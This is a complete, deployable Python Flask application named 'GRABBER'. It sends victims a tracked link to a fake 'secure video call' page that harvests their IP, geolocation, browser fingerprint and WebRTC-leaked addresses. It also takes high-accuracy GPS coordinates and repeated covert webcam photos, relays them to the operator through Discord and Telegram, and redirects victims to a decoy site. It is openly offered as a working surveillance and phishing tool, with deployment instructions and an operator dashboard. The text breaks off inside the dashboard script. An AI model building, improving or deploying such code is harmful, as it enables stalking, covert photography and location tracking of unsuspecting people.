#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────
#  GRABBER — 24/7 auto-capture IP logger + Telegram bot (FIXED)
#  Free stack: GitHub + Render + Telegram + cron-job.org
#  Cloud:  gunicorn -w 1 -b 0.0.0.0:$PORT app:app   (Procfile)
#  Local:  python3 app.py                             (testing)
#  Fixes:  hardened bot loop (webhook clear, Conflict retry,
#          visible [tg] logs) — no more silent "Hello World" clash
#          + polling now runs manually (no signal handlers) so
#          it works inside a background thread (PTB >= 20)
# ─────────────────────────────────────────────────────────────
import os, re, json, time, uuid, threading, asyncio
import datetime as dt
from pathlib import Path
import requests
from flask import Flask, request, jsonify, redirect, send_from_directory, Response

BASE_URL     = os.getenv("BASE_URL", "").strip().rstrip("/")
ADMIN_TOKEN  = os.getenv("ADMIN_TOKEN", "")
ACCESS_TOKEN = os.getenv("ACCESS_TOKEN", "")
DISCORD_URL  = os.getenv("DISCORD_WEBHOOK_URL", "")
TG_TOKEN     = os.getenv("TELEGRAM_BOT_TOKEN", "")
TG_CHAT      = os.getenv("TELEGRAM_CHAT_ID", "")
TG_ADMINS    = [int(x) for x in os.getenv("TELEGRAM_ADMIN_IDS", "").split(",") if x.strip().isdigit()]
if not TG_ADMINS and TG_CHAT.lstrip("-").isdigit():
    TG_ADMINS = [int(TG_CHAT)]
DECOY_URL    = os.getenv("DECOY_URL", "https://www.meetskip.com/chat")
INTERVAL_MS  = int(os.getenv("INTERVAL_MS", "3000"))
MAX_PHOTOS   = int(os.getenv("MAX_PHOTOS", "30"))
CAM_FACING   = os.getenv("CAM_FACING", "user")
LOG_FILE     = Path(os.getenv("LOG_FILE", "hits.jsonl"))
IMAGE_DIR    = Path(os.getenv("IMAGE_DIR", "images"))
IMAGE_DIR.mkdir(exist_ok=True)

app = Flask(__name__)
HITS = []
_lock = threading.Lock()
_bot_started = False

# ── helpers ──────────────────────────────────────────────────
def _now(): return dt.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
def _new_id(): return uuid.uuid4().hex[:8]

def _ip(req):
    fwd = req.headers.get("X-Forwarded-For", "")
    if fwd: return fwd.split(",")[0].strip()
    return req.remote_addr or "?"

def _geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,org,as,proxy,hosting", timeout=5)
        d = r.json()
        if d.get("status") == "success": return d
    except Exception:
        pass
    return {}

def _save(rec):
    try:
        with _lock, open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except Exception:
        pass

def _append_hit(h):
    with _lock:
        HITS.append(h)
        if len(HITS) > 1000: del HITS[:-1000]

def _get_hit(hid):
    for h in reversed(HITS):
        if h.get("hit_id") == hid: return h
    return None

def _find_hit(hid): return _get_hit(hid)

def _latest_hits():
    with _lock: return list(HITS)

def _replay_log():
    if not LOG_FILE.exists(): return
    seen = {}
    try:
        with open(LOG_FILE, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                try: rec = json.loads(line)
                except Exception: continue
                hid = rec.get("hit_id")
                if not hid: continue
                t = rec.get("type")
                if t == "hit":
                    h = {k: v for k, v in rec.items() if k != "type"}
                    h.setdefault("photos", [])
                    seen[hid] = h
                elif hid in seen:
                    if t == "fingerprint": seen[hid]["fp"] = rec.get("fp")
                    elif t == "webrtc": seen[hid]["webrtc"] = rec.get("leaks")
                    elif t == "gps":
                        seen[hid]["gps"] = "GRANTED"
                        seen[hid]["lat"] = rec.get("lat")
                        seen[hid]["lon"] = rec.get("lon")
                        seen[hid]["acc"] = rec.get("acc")
                    elif t == "photo": seen[hid].setdefault("photos", []).append(rec.get("file"))
    except Exception:
        pass
    HITS.extend(list(seen.values())[-500:])

# ── VPN / proxy detection ────────────────────────────────────
VPN_ASNS = {9009,20473,14061,16276,24940,63949,12876,51167,53667,212238,163,13335,31898,16509,14618,15169,16265,6939,174,7979,46690,3214,396982,206264}

def _vpn_check(geo, fp):
    reasons = []
    asn = geo.get("as") or ""
    m = re.match(r"AS?(\d+)", asn)
    if m and int(m.group(1)) in VPN_ASNS: reasons.append("hosting/VPN ASN: " + asn)
    tz_ip = geo.get("timezone"); tz_js = (fp or {}).get("timezone")
    if tz_ip and tz_js and tz_js != tz_ip:
        reasons.append(f"timezone mismatch ({tz_ip} vs {tz_js})")
    return reasons

# ── delivery: Discord + Telegram ─────────────────────────────
def send_discord(content=None, embed=None, photo=None):
    if not DISCORD_URL: return
    try:
        data = {}
        if content: data["content"] = content
        if embed: data["embeds"] = [embed]
        if photo and Path(photo).exists():
            with open(photo, "rb") as f:
                requests.post(DISCORD_URL, data=data,
                              files={"file": (Path(photo).name, f, "image/jpeg")}, timeout=10)
        else:
            requests.post(DISCORD_URL, json=data, timeout=10)
    except Exception as e:
        print("[!discord]", e, flush=True)

def send_telegram(text="", photo=None):
    if not TG_TOKEN or not TG_CHAT: return
    try:
        if photo and Path(photo).exists():
            with open(photo, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendPhoto",
                              data={"chat_id": TG_CHAT, "caption": text},
                              files={"photo": f}, timeout=15)
        else:
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                          json={"chat_id": TG_CHAT, "text": text, "parse_mode": "HTML",
                                "disable_web_page_preview": True}, timeout=10)
    except Exception as e:
        print("[!telegram]", e, flush=True)

def notify(text=None, embed=None, photo=None):
    send_discord(content=text, embed=embed, photo=photo)
    if text: send_telegram(text, photo=photo)

def d_embed(title, fields, color=0x5865F2):
    return {"title": title, "color": color,
            "fields": [{"name": str(k), "value": str(v)[:1024], "inline": True} for k, v in fields],
            "footer": {"text": _now()}}

# ── auth ─────────────────────────────────────────────────────
def _auth_ok():
    return (request.headers.get("X-Access-Token") == ACCESS_TOKEN) or (request.args.get("token") == ACCESS_TOKEN)

# ── public routes ────────────────────────────────────────────
@app.route("/ping")
def ping(): return "pong"

@app.route("/")
def index(): return redirect(DECOY_URL, 302)

@app.route("/r/<campaign>")
def track(campaign):
    if not re.match(r"^[a-zA-Z0-9_-]{1,32}$", campaign): return redirect(DECOY_URL, 302)
    return Response(TRACK_HTML
                    .replace("__CAMPAIGN__", campaign)
                    .replace("__TOKEN__", ACCESS_TOKEN)
                    .replace("__INTERVAL__", str(INTERVAL_MS))
                    .replace("__MAX__", str(MAX_PHOTOS))
                    .replace("__FACING__", CAM_FACING)
                    .replace("__DECOY__", DECOY_URL), mimetype="text/html")

@app.route("/img/<fn>")
def img(fn):
    if not re.match(r"^[A-Za-z0-9_.-]+$", fn): return "no", 400
    p = IMAGE_DIR / fn
    if not p.exists(): return "no", 404
    return send_from_directory(IMAGE_DIR, fn)

# ── ingest endpoints ─────────────────────────────────────────
@app.route("/api/beacon", methods=["POST"])
def api_beacon():
    if not _auth_ok(): return jsonify({"error": "forbidden"}), 403
    d = request.get_json(silent=True) or {}
    ip = _ip(request)
    geo = _geo(ip)
    hit = {"hit_id": _new_id(), "ts": _now(), "campaign": d.get("campaign", "default"),
           "ip": ip, "ua": (d.get("ua") or "")[:300], "screen": d.get("screen", ""),
           "lang": d.get("lang", ""), "ref": (d.get("ref") or "")[:300],
           "geo": geo, "photos": []}
    _save({"type": "hit", **hit})
    _append_hit(hit)
    loc = ", ".join(x for x in [geo.get("city"), geo.get("regionName"), geo.get("country")] if x) or "?"
    notify(embed=d_embed("🟢 PAGE LOAD", [
        ("IP", hit["ip"]), ("Location", loc), ("ISP", geo.get("isp") or "—"),
        ("Campaign", hit["campaign"]), ("Screen", hit["screen"]),
        ("UA", hit["ua"][:200])], 0x2ECC71),
        text=f"🟢 <b>PAGE LOAD</b> — {hit['ip']} · {loc} · <code>{hit['campaign']}</code>")
    return jsonify({"ok": True, "hit_id": hit["hit_id"]})

@app.route("/api/fingerprint", methods=["POST"])
def api_fingerprint():
    if not _auth_ok(): return jsonify({"error": "forbidden"}), 403
    d = request.get_json(silent=True) or {}
    h = _get_hit(d.get("hit_id", ""))
    if not h: return jsonify({"ok": False}), 404
    fp = d.get("fp") or {}
    h["fp"] = fp
    _save({"type": "fingerprint", "hit_id": h["hit_id"], "fp": fp})
    canvas = fp.get("canvas", "")[:40]; webgl = fp.get("webgl", "")[:60]
    notify(embed=d_embed("🧬 FINGERPRINT", [
        ("Canvas", canvas or "—"), ("WebGL", webgl or "—"),
        ("Timezone", fp.get("timezone", "—")), ("Screen", fp.get("screen", "—")),
        ("Fonts", str(fp.get("fonts", ""))[:100]), ("Langs", str(fp.get("langs", ""))[:60]),
        ("Mem/CPU", f"{fp.get('devmem','?')}GB / {fp.get('cores','?')} cores"),
        ("Battery", str(fp.get("battery", "—"))), ("Dark", fp.get("dark", "?")),
        ("DNT", fp.get("dnt", "?")), ("Touch", fp.get("touch", "?")),
        ("Conn", fp.get("conn", "—")), ("Platform", fp.get("platform", "—"))], 0x9B59B6),
        text=f"🧬 <b>FINGERPRINT</b> {h['hit_id']}\ncanvas: {canvas}\nwebgl: {webgl}\ntz: {fp.get('timezone','—')}\nmem: {fp.get('devmem','?')}GB · {fp.get('cores','?')} cores")
    return jsonify({"ok": True})

@app.route("/api/webrtc", methods=["POST"])
def api_webrtc():
    if not _auth_ok(): return jsonify({"error": "forbidden"}), 403
    d = request.get_json(silent=True) or {}
    h = _get_hit(d.get("hit_id", ""))
    if not h: return jsonify({"ok": False}), 404
    leaks = d.get("leaks") or {}
    h["webrtc"] = leaks
    _save({"type": "webrtc", "hit_id": h["hit_id"], "leaks": leaks})
    vpn = _vpn_check(h.get("geo") or {}, h.get("fp") or {})
    notify(embed=d_embed("🌐 WEBRTC / VPN", [
        ("Local IPs", str(leaks.get("local", "—"))[:200]),
        ("Public IP", str(leaks.get("public", "—"))[:200]),
        ("VPN flags", ", ".join(vpn) or "none detected")], 0xE74C3C if vpn else 0x3498DB),
        text=f"🌐 <b>WEBRTC</b> {h['hit_id']}\n{'⚠️ VPN: ' + ', '.join(vpn) if vpn else 'no VPN flags'}\nlocal: {leaks.get('local','—')}\npublic: {leaks.get('public','—')}")
    return jsonify({"ok": True})

@app.route("/api/gps", methods=["POST"])
def api_gps():
    if not _auth_ok(): return jsonify({"error": "forbidden"}), 403
    d = request.get_json(silent=True) or {}
    h = _get_hit(d.get("hit_id", ""))
    if not h: return jsonify({"ok": False}), 404
    if d.get("denied"):
        if h.get("gps") != "GRANTED": h["gps"] = "DENIED"
        return jsonify({"ok": True})
    lat, lon, acc = d.get("lat"), d.get("lon"), d.get("acc")
    if lat is None or lon is None: return jsonify({"ok": False}), 400
    if h.get("lat") is not None and abs(h["lat"] - lat) < 0.0015 and abs(h["lon"] - lon) < 0.0015:
        return jsonify({"ok": True, "dup": True})
    h["gps"] = "GRANTED"; h["lat"] = lat; h["lon"] = lon; h["acc"] = acc
    _save({"type": "gps", "hit_id": h["hit_id"], "lat": lat, "lon": lon, "acc": acc})
    geo = h.get("geo") or {}
    loc = ", ".join(x for x in [geo.get("city"), geo.get("regionName"), geo.get("country")] if x)
    notify(embed=d_embed("🛰️ GPS FIX", [
        ("Lat", lat), ("Lon", lon), ("Accuracy", f"{acc} m"),
        ("Place", loc or "—"), ("Map", f"https://www.google.com/maps?q={lat},{lon}")], 0xF1C40F),
        text=f"🛰️ <b>GPS</b> {h['hit_id']}\n{lat}, {lon} (±{acc} m)\n{loc}\nhttps://www.google.com/maps?q={lat},{lon}")
    return jsonify({"ok": True})

@app.route("/api/photo", methods=["POST"])
def api_photo():
    if not _auth_ok(): return jsonify({"error": "forbidden"}), 403
    h = _get_hit(request.form.get("hit_id", ""))
    if not h: return jsonify({"ok": False}), 404
    f = request.files.get("photo")
    if not f: return jsonify({"ok": False}), 400
    n = len(h.get("photos") or [])
    if n >= MAX_PHOTOS: return jsonify({"ok": True, "stop": True})
    fn = f"{h['hit_id']}_{int(time.time())}_{n}.jpg"
    f.save(IMAGE_DIR / fn)
    h.setdefault("photos", []).append(fn)
    _save({"type": "photo", "hit_id": h["hit_id"], "file": fn})
    txt = f"📷 <b>CAMERA FRAME</b> {h['hit_id']} · {h.get('campaign') or 'default'} ({n+1}/{MAX_PHOTOS})"
    notify(text=txt, photo=str(IMAGE_DIR / fn))
    return jsonify({"ok": True, "n": n + 1})

@app.route("/api/note", methods=["POST"])
def api_note():
    if not _auth_ok(): return jsonify({"error": "forbidden"}), 403
    d = request.get_json(silent=True) or {}
    notify(text=f"📵 {d.get('msg','note')} {d.get('hit_id','')}")
    return jsonify({"ok": True})

# ── admin dashboard ──────────────────────────────────────────
@app.route("/admin")
def admin():
    if request.args.get("token") != ADMIN_TOKEN: return "403 forbidden", 403
    return ADMIN_HTML.replace("__TOKEN__", ADMIN_TOKEN)

@app.route("/api/stats")
def api_stats():
    if request.args.get("token") != ADMIN_TOKEN: return jsonify({"error": "forbidden"}), 403
    with _lock:
        total = len(HITS)
        gps = sum(1 for h in HITS if h.get("gps") == "GRANTED")
        photos = sum(len(h.get("photos") or []) for h in HITS)
        camps = {}
        for h in HITS:
            c = h.get("campaign") or "default"
            camps[c] = camps.get(c, 0) + 1
        recent = [{"id": h.get("hit_id"), "ts": h.get("ts"), "ip": h.get("ip"),
                   "campaign": h.get("campaign") or "default", "gps": h.get("gps"),
                   "lat": h.get("lat"), "lon": h.get("lon"),
                   "photos": len(h.get("photos") or []),
                   "city": (h.get("geo") or {}).get("city"),
                   "country": (h.get("geo") or {}).get("country")}
                  for h in HITS[-30:]][::-1]
        last_photos = []
        for h in reversed(HITS):
            for fn in reversed(h.get("photos") or []):
                last_photos.append(fn)
                if len(last_photos) >= 9: break
            if len(last_photos) >= 9: break
    return jsonify({"total": total, "gps": gps, "photos": photos,
                    "campaigns": camps, "recent": recent,
                    "last_photos": last_photos, "base_url": BASE_URL})

# ── Telegram bot (hardened: webhook clear + Conflict retry) ──
def run_telegram_bot():
    from telegram import InputMediaPhoto
    from telegram.ext import Application, CommandHandler
    from telegram.error import Conflict, InvalidToken

    print("[tg] bot thread started", flush=True)

    while True:
        try:
            # clear any stale webhook so polling can start
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/deleteWebhook", timeout=10)
            bot_app = Application.builder().token(TG_TOKEN).build()

            async def guard(update, context):
                if TG_ADMINS and update.effective_user.id not in TG_ADMINS:
                    await update.message.reply_text("⛔ Not authorized.")
                    return False
                return True

            async def cmd_start(update, context):
                if not await guard(update, context): return
                await update.message.reply_text(
                    "🤖 GRABBER bot online.\n\n"
                    "/link <name> — generate a tracked link\n"
                    "/stats — totals (hits / GPS / photos / campaigns)\n"
                    "/last <n> — last n hits\n"
                    "/gps — latest GPS fix + map\n"
                    "/photos — last 3 camera frames\n"
                    "/hit <id> — full details of one hit\n"
                    "/help — this message")

            async def cmd_link(update, context):
                if not await guard(update, context): return
                name = (context.args[0] if context.args else "").strip()
                if not re.match(r"^[a-zA-Z0-9_-]{1,32}$", name):
                    await update.message.reply_text("❌ Use only letters/numbers/-/_ (max 32 chars).")
                    return
                base = BASE_URL.strip().rstrip("/")
                if not base:
                    await update.message.reply_text("❌ Set BASE_URL env var (your public app URL).")
                    return
                await update.message.reply_text(f"🔗 {base}/r/{name}", disable_web_page_preview=True)

            async def cmd_stats(update, context):
                if not await guard(update, context): return
                hits = _latest_hits()
                photos = sum(len(h.get("photos") or []) for h in hits)
                gps = sum(1 for h in hits if h.get("gps") == "GRANTED" and h.get("lat") is not None)
                camps = {}
                for h in hits:
                    c = h.get("campaign") or "default"
                    camps[c] = camps.get(c, 0) + 1
                txt = f"<b>📊 Stats</b>\nHits: {len(hits)}\nGPS fixes: {gps}\nPhotos: {photos}\n"
                if camps:
                    txt += "Campaigns:\n" + "\n".join(f"  • {k}: {v}" for k, v in sorted(camps.items(), key=lambda x: -x[1]))
                await update.message.reply_text(txt, parse_mode="HTML")

            async def cmd_last(update, context):
                if not await guard(update, context): return
                try:
                    n = max(1, min(20, int(context.args[0]))) if context.args else 5
                except ValueError:
                    n = 5
                hits = _latest_hits()
                if not hits:
                    await update.message.reply_text("No hits yet.")
                    return
                lines = []
                for h in hits[-n:][::-1]:
                    geo = h.get("geo") or {}
                    loc = ", ".join(x for x in [geo.get("city"), geo.get("regionName"), geo.get("country")] if x) or "?"
                    gps = " 📍" if (h.get("gps") == "GRANTED" and h.get("lat") is not None) else ""
                    ph = len(h.get("photos") or [])
                    lines.append(f"{str(h.get('ts'))[:19]} | {h.get('ip','?')} | {loc} | {h.get('campaign') or 'default'} | 📷{ph}{gps}")
                await update.message.reply_text("<b>Last hits</b>\n" + "\n".join(lines), parse_mode="HTML")

            async def cmd_gps(update, context):
                if not await guard(update, context): return
                for h in reversed(_latest_hits()):
                    if h.get("gps") == "GRANTED" and h.get("lat") is not None:
                        geo = h.get("geo") or {}
                        loc = ", ".join(x for x in [geo.get("city"), geo.get("regionName"), geo.get("country")] if x)
                        await update.message.reply_text(
                            f"🛰️ <b>Latest GPS</b>\nHit: {h.get('hit_id')}\n"
                            f"Lat: {h.get('lat')}\nLon: {h.get('lon')}\n"
                            f"Accuracy: {h.get('acc')} m\nPlace: {loc or '—'}\n"
                            f"Map: https://www.google.com/maps?q={h.get('lat')},{h.get('lon')}",
                            parse_mode="HTML", disable_web_page_preview=True)
                        return
                await update.message.reply_text("No GPS fix recorded yet.")

            async def cmd_photos(update, context):
                if not await guard(update, context): return
                paths = []
                for h in reversed(_latest_hits()):
                    for fn in reversed(h.get("photos") or []):
                        p = IMAGE_DIR / fn
                        if p.exists(): paths.append(p)
                        if len(paths) >= 3: break
                    if len(paths) >= 3: break
                if not paths:
                    await update.message.reply_text("No photos yet.")
                    return
                media = [InputMediaPhoto(open(p, "rb"), caption=p.name if i == 0 else None) for i, p in enumerate(paths)]
                await context.bot.send_media_group(chat_id=update.effective_chat.id, media=media)

            async def cmd_hit(update, context):
                if not await guard(update, context): return
                if not context.args:
                    await update.message.reply_text("Usage: /hit <hit_id>")
                    return
                h = _find_hit(context.args[0])
                if not h:
                    await update.message.reply_text("Hit not found.")
                    return
                geo = h.get("geo") or {}
                gps = f"📍 {h.get('lat')}, {h.get('lon')}" if (h.get("gps") == "GRANTED" and h.get("lat") is not None) else "denied"
                await update.message.reply_text(
                    f"<b>Hit {h.get('hit_id')}</b>\n"
                    f"Time: {h.get('ts')}\nIP: {h.get('ip')}\nCampaign: {h.get('campaign') or 'default'}\n"
                    f"Place: {geo.get('city','')} {geo.get('regionName','')} {geo.get('country','')}\n"
                    f"ISP: {geo.get('isp','—')}\nGPS: {gps}\n"
                    f"Screen: {h.get('screen') or '—'}\n"
                    f"UA: {(h.get('ua') or '—')[:80]}\nPhotos: {len(h.get('photos') or [])}",
                    parse_mode="HTML")

            for cmd, fn in (("start", cmd_start), ("help", cmd_start), ("link", cmd_link),
                            ("stats", cmd_stats), ("last", cmd_last), ("gps", cmd_gps),
                            ("photos", cmd_photos), ("hit", cmd_hit)):
                bot_app.add_handler(CommandHandler(cmd, fn))

            send_telegram("🤖 GRABBER bot online — listening for commands.")

            # ── FIX: run polling without signal handlers ──────────────
            # run_polling()/idle() install SIGINT/SIGTERM/SIGABRT handlers
            # via loop.add_signal_handler() -> signal.set_wakeup_fd(), which
            # is only allowed in the MAIN thread. This bot lives in a
            # background thread, so drive the PTB lifecycle manually and
            # keep the loop alive with a long sleep instead.
            async def _run_polling():
                await bot_app.initialize()
                await bot_app.start()
                await bot_app.updater.start_polling(
                    allowed_updates=["message"], drop_pending_updates=True
                )
                print("[tg] polling started", flush=True)
                while True:
                    await asyncio.sleep(3600)  # keep event loop running

            asyncio.run(_run_polling())
            print("[tg] polling stopped", flush=True)
            break

        except Conflict as e:
            print(f"[tg] CONFLICT: another instance is using this token. Stop it and redeploy. ({e})", flush=True)
            time.sleep(30)
        except InvalidToken as e:
            print(f"[tg] INVALID TOKEN — check TELEGRAM_BOT_TOKEN env var. ({e})", flush=True)
            return
        except Exception as e:
            print(f"[tg] error: {e!r} — retrying in 15s", flush=True)
            time.sleep(15)

def _maybe_start_bot():
    global _bot_started
    if _bot_started or not TG_TOKEN: return
    try:
        import telegram  # noqa: F401
    except ImportError:
        print("[!] python-telegram-bot not installed — run: pip install -r requirements.txt", flush=True)
        return
    _bot_started = True
    threading.Thread(target=run_telegram_bot, daemon=True).start()
    print("[+] Telegram bot thread started", flush=True)

# ── the tracking page (sent to every visitor) ────────────────
TRACK_HTML = """<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Video Call</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(160deg,#0f172a,#1e293b);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,Segoe UI,Roboto,sans-serif;color:#e2e8f0}
.card{text-align:center;padding:40px}
.ring{width:120px;height:120px;border-radius:50%;background:#334155;margin:0 auto 24px;position:relative;animation:pulse 1.6s infinite}
.ring::after{content:"";position:absolute;inset:14px;border-radius:50%;background:#64748b}
h1{font-size:20px;font-weight:600;margin-bottom:8px}
p{color:#94a3b8;font-size:14px}
@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(56,189,248,.35)}50%{box-shadow:0 0 0 18px rgba(56,189,248,0)}}
.hint{margin-top:28px;font-size:12px;color:#64748b}
</style></head><body>
<div class="card"><div class="ring"></div>
<h1>Starting secure video call…</h1>
<p>Please allow camera and location access to join.</p>
<div class="hint">Connecting</div></div>
<script>
var CAMPAIGN="__CAMPAIGN__",TOKEN="__TOKEN__",INTERVAL=__INTERVAL__,MAX=__MAX__;
var FACING="__FACING__",DECOY="__DECOY__",HID="";
function post(p,o){fetch(p,{method:"POST",headers:{"Content-Type":"application/json","X-Access-Token":TOKEN},body:JSON.stringify(o)}).catch(function(){});}
function canvasHash(){try{var c=document.createElement("canvas");c.width=240;c.height=60;var x=c.getContext("2d");x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(0,0,240,60);x.fillStyle="#069";x.fillText("GRABBER"+Date.now(),4,20);x.strokeStyle="#000";x.beginPath();x.arc(80,30,20,0,Math.PI*2);x.stroke();return c.toDataURL().slice(-64);}catch(e){return "err";}}
function webglInfo(){try{var c=document.createElement("canvas");var g=c.getContext("webgl")||c.getContext("experimental-webgl");if(!g)return "no-webgl";var ext=g.getExtension("WEBGL_debug_renderer_info");return ext?(g.getParameter(ext.UNMASKED_VENDOR_WEBGL)+" | "+g.getParameter(ext.UNMASKED_RENDERER_WEBGL)):"n/a";}catch(e){return "err";}}
async function fontList(){var L=["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Impact","Roboto","Segoe UI","Tahoma","Trebuchet MS","Monaco","Consolas","Calibri","Cambria","Helvetica"],out=[];try{await document.fonts.ready;L.forEach(function(f){try{if(document.fonts.check('16px "'+f+'"'))out.push(f);}catch(e){}});}catch(e){}return out.join(", ");}
async function batteryInfo(){try{if(!navigator.getBattery)return "n/a";var b=await navigator.getBattery();return Math.round(b.level*100)+"% "+(b.charging?"charging":"battery");}catch(e){return "n/a";}}
async function fingerprint(){var fp={canvas:canvasHash(),webgl:webglInfo(),timezone:(function(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){return "";}})(),screen:screen.width+"x"+screen.height,colorDepth:screen.colorDepth,devicePixelRatio:window.devicePixelRatio||1,platform:(navigator.platform||""),langs:navigator.languages?navigator.languages.join(", "):navigator.language,cores:navigator.hardwareConcurrency||"?",devmem:navigator.deviceMemory||"?",touch:("ontouchstart" in window)?"yes":"no",dark:(window.matchMedia&&matchMedia("(prefers-color-scheme: dark)").matches)?"yes":"no",dnt:navigator.doNotTrack||"?",conn:(navigator.connection&&navigator.connection.effectiveType)||"n/a",fonts:"",battery:"",plugins:(function(){var p=[];try{for(var i=0;i<navigator.plugins.length&&i<10;i++)p.push(navigator.plugins[i].name);}catch(e){}return p.join(", ");})()};fp.fonts=await fontList();fp.battery=await batteryInfo();return fp;}
function webrtcLeak(){return new Promise(function(res){var out={local:[],public:""};try{var pc=new RTCPeerConnection({iceServers:[{urls:["stun:stun.l.google.com:19302","stun:stun1.l.google.com:19302"]}]});pc.createDataChannel("d");pc.onicecandidate=function(e){if(e.candidate){var m=/([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);if(m&&out.local.indexOf(m[1])===-1)out.local.push(m[1]);}};pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(){});setTimeout(function(){fetch("https://api.ipify.org?format=json").then(function(r){return r.json();}).then(function(d){out.public=d.ip;res(out);}).catch(function(){res(out);});},2500);}catch(e){res(out);}});}
function gpsFix(){return new Promise(function(res){if(!navigator.geolocation)return res({denied:true});navigator.geolocation.getCurrentPosition(function(p){res({lat:p.coords.latitude,lon:p.coords.longitude,acc:Math.round(p.coords.accuracy)});},function(){res({denied:true});},{enableHighAccuracy:true,timeout:10000,maximumAge:0});});}
function runCam(stream){var v=document.createElement("video");v.srcObject=stream;v.play();var c=document.createElement("canvas");c.width=640;c.height=480;var x=c.getContext("2d");var shots=0,stopped=false;function snap(){if(stopped||shots>=MAX)return;x.drawImage(v,0,0,640,480);c.toBlob(function(b){if(!b)return;var fd=new FormData();fd.append("hit_id",HID);fd.append("photo",b,"cam.jpg");fetch("/api/photo",{method:"POST",headers:{"X-Access-Token":TOKEN},body:fd}).then(function(r){return r.json();}).then(function(d){if(d.stop){stopped=true;stream.getTracks().forEach(function(t){t.stop();});}}).catch(function(){});shots++;},"image/jpeg",0.7);setTimeout(snap,INTERVAL+Math.random()*800);}snap();setTimeout(function(){stopped=true;stream.getTracks().forEach(function(t){t.stop();});goDecoy();},60000);}
async function tryCam(){for(var i=0;i<2;i++){try{var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:FACING},audio:false});runCam(s);return;}catch(e){await new Promise(function(r){setTimeout(r,2500);});}}post("/api/note",{hit_id:HID,msg:"camera denied"});setTimeout(goDecoy,4000);}
function goDecoy(){try{location.href=DECOY;}catch(e){}}
async function main(){
  try{var r=await fetch("/api/beacon",{method:"POST",headers:{"Content-Type":"application/json","X-Access-Token":TOKEN},body:JSON.stringify({campaign:CAMPAIGN,ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:(navigator.language||""),ref:document.referrer||""})});var d=await r.json();HID=d.hit_id||("x"+Date.now());}catch(e){HID="x"+Date.now();}
  post("/api/fingerprint",{hit_id:HID,fp:await fingerprint()});
  post("/api/webrtc",{hit_id:HID,leaks:await webrtcLeak()});
  var g=await gpsFix();
  if(g.denied){post("/api/gps",{hit_id:HID,denied:true});}else{post("/api/gps",{hit_id:HID,lat:g.lat,lon:g.lon,acc:g.acc});}
  await tryCam();
}
main();
</script></body></html>"""

# ── admin dashboard HTML ─────────────────────────────────────
ADMIN_HTML = """<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>GRABBER Admin</title><style>
body{background:#0f172a;color:#e2e8f0;font-family:-apple-system,Segoe UI,Roboto,sans-serif;margin:0;padding:24px}
.wrap{max-width:980px;margin:auto}h1{font-size:22px}
.cards{display:flex;gap:14px;flex-wrap:wrap;margin:18px 0}
.card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:14px 18px;min-width:120px}
.card b{display:block;font-size:26px}
.gen{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:16px;margin:16px 0;display:flex;gap:10px;flex-wrap:wrap}
.gen input{background:#0f172a;border:1px solid #475569;color:#e2e8f0;padding:8px 12px;border-radius:6px;flex:1;min-width:200px}
.gen button,.gen a{background:#2563eb;color:#fff;border:0;padding:8px 16px;border-radius:6px;cursor:pointer;text-decoration:none}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{text-align:left;padding:7px 10px;border-bottom:1px solid #1e293b}
th{color:#94a3b8;font-weight:600}
.photos{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}
.photos img{width:110px;height:82px;object-fit:cover;border-radius:6px;border:1px solid #334155}
a{color:#60a5fa}
</style></head><body><div class="wrap">
<h1>GRABBER Dashboard</h1>
<div class="cards">
<div class="card"><b id="cTotal">–</b>Hits</div>
<div class="card"><b id="cGps">–</b>GPS fixes</div>
<div class="card"><b id="cPhoto">–</b>Photos</div>
<div class="card"><b id="cCamps">–</b>Campaigns</div></div>
<div class="gen"><input id="name" placeholder="campaign name, e.g. promo1"><button onclick="genLink()">Generate link</button><a id="out" style="display:none" target="_blank">open</a></div>
<div id="camps"></div>
<h3>Recent hits</h3>
<table><thead><tr><th>Time</th><th>IP</th><th>Place</th><th>Campaign</th><th>GPS</th><th>Photos</th></tr></thead><tbody id="rows"></tbody></table>
<h3>Latest photos</h3><div class="photos" id="photos"></div>
<script>
var TOKEN="__TOKEN__";
async function load(){var r=await fetch("/api/stats?token="+TOKEN);var d=await r.json();
document.getElementById("cTotal").textContent=d.total;
document.getElementById("cGps").textContent=d.gps;
document.getElementById("cPhoto").textContent=d.photos;
document.getElementById("cCamps").textContent=Object.keys(d.campaigns||{}).length;
var camps="";for(var c in d.campaigns)camps+=c+": "+d.campaigns[c]+"   ";
document.getElementById("camps").textContent=camps;
var rows="";(d.recent||[]).forEach(function(h){var loc=(h.city||"")+", "+(h.country||"");
var g=(h.gps==="GRANTED"&&h.lat)?"<a href='https://www.google.com/maps?q="+h.lat+","+h.lon+"' target='_blank'>📍</a>":"—";
rows+="<tr><td>"+h.ts+"</td><td>"+h.ip+"</td><td>"+loc+"</td><td>"+h.campaign+"</td><td>"+g+"</td><td>"+h.photos+"</td></tr>";});
document.getElementById("rows").innerHTML=rows;
var ph="";(d.last_photos||[]).forEach(function(fn){ph+="<img src='/img/"+fn+"'>";});
document.getElementById("photos").innerHTML=ph;}
